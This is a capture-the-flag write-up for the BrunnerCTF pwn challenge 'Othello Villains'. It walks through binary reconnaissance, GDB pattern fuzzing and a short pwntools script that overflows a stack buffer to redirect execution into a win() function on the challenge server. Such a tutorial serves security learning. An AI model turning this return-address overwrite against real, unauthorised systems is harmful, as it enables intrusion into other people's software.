---
description: 'Difficulty: Easy Author: olexmeister'
---

# Othello Villains —  Pwn

## Othello Villains — Pwn Writeup (BrunnerCTF)

**Category:** Pwn (Buffer Overflow)\
**Difficulty:** Easy\
**Author:** olexmeister

***

### 📜 Challenge Description

> The Othello villains stole our sacred Brunner recipe! Luckily, they are unable to write secure code. Retrieve the recipe from their (in)secure vault!

Service:

```bash
ncat --ssl othello-villains-ff676b52adca52ed.challs.brunnerne.xyz 443
```

We were given a 64-bit ELF binary:

```bash
$ file othelloserver
othelloserver: ELF 64-bit LSB executable, x86-64, dynamically linked, no PIE
```

Security check:

```bash
$ checksec --file=othelloserver
RELRO           STACK CANARY      NX            PIE
Partial RELRO   No canary found   NX enabled    No PIE
```

🔑 Translation:

* **No canary** → free buffet for stack BOFs 🍝
* **NX enabled** → no stack shellcode; just pivot/jump to existing code
* **No PIE** → addresses are static (chef’s kiss)
* **Partial RELRO** → GOT shenanigans possible but unnecessary here

***

### 🔍 Recon

Find interesting functions:

```bash
$ nm othelloserver | grep -E 'main|win'
000000000040125b T main
00000000004012ae T win
```

Boom 💥 there’s a `win()` at `0x4012ae`. Almost certainly prints the recipe/flag. Plan: overflow → overwrite return address → land in `win()`.

***

### 🧪 Pattern Fuzzing (a.k.a. “I tried 80, it bricked but not the way I wanted”)

Goal: find the **exact offset** to RIP.

1. Generate a cyclic pattern (first attempt: 80 bytes):

```bash
$ python3 -c 'from pwn import *; print(cyclic(80))' > pattern80.txt
```

2. Run under GDB:

```bash
$ gdb ./othelloserver
(gdb) run < pattern80.txt
```

We get a segfault, but…

```gdb
(gdb) info registers rip
rip            0x4012ad            0x4012ad <main+82>
```

😬 RIP is still inside `main`, not `0x61...`. Translation: we **crashed before `ret`**, likely because our overflow clobbered a local pointer/length that got used, causing a bad access _inside_ `main`. We haven’t actually overwritten the saved RIP yet, so you won’t see the classic `0x61616161` in RIP.

#### 🔍 So why `x/gx $rsp`?

When RIP doesn’t show our neat pattern, we **peek at the stack** to verify our input actually landed there and to eyeball how far we are from the saved RIP:

```gdb
(gdb) x/40gx $rsp
0x7fffffffdbc8: 0x616c6161616b6161      0x00000027616d6161
...
0x7fffffffdc68: 0x00007ffff7dd9e25      0x000000000040125b
```

* You can **see the pattern bytes** (`0x61` = ‘a’) on the stack → overflow is real ✅
* You can also see nearby return addresses (e.g., `0x40125b`), helping you gauge roughly where the **saved RIP** will live.
* TL;DR: `x/gx $rsp` is your periscope — it proves you’re smashing the stack and helps you visualize the distance to the saved return address when the crash happens _before_ the `ret`.

> Pro-tip: When RIP isn’t overwritten yet, use smaller/larger patterns, or directly try common offsets for tiny 64-bit buffers (often **40**–**48** bytes).

***

### 🎯 Locking the Offset (the “aha!” step)

Instead of wrestling with `cyclic_find` on a 64-bit junk RIP (64-bit can include non-pattern high bytes), I tested the classic beginner offset:

* **Try `OFFSET = 40`** (very common for small stack buffers in 64-bit)
* If it fails, nudge ±8 bytes. In our case, **40 worked**.

(If you want to be fancy with `cyclic_find` on 64-bit, use `cyclic_find(value, n=8)`, or feed only the lower 4 bytes if high bytes are polluted.)

***

### 🚀 Final Exploit

Jump straight to `win()`:

```python
from pwn import *

io = remote('othello-villains-ff676b52adca52ed.challs.brunnerne.xyz', 443, ssl=True)

OFFSET = 40
WIN_ADDR = 0x4012ae

payload = b"A" * OFFSET + p64(WIN_ADDR)
io.sendline(payload)
io.interactive()
```

Run it and boom 💣 — control flow yeets into `win()` and the sacred Brunner recipe drops.

***

### 🧑‍🍳 Key Takeaways

* **Crash ≠ RIP control.** If you segfault inside `main`, you likely corrupted locals but haven’t hit the saved RIP yet.
* **Use `x/gx $rsp`** to confirm your pattern sits on the stack and to visualize proximity to the saved RIP.
* **Beginner offset heuristics**: small 64-bit buffers often need \~**40 bytes** to RIP. Try that early to save time.
* **No canary + No PIE** = easy mode: aim for `win()` before going full ROP saga.
* **64-bit `cyclic_find` gotchas**: pass `n=8` or use lower 4 bytes if the top bytes aren’t from the pattern.
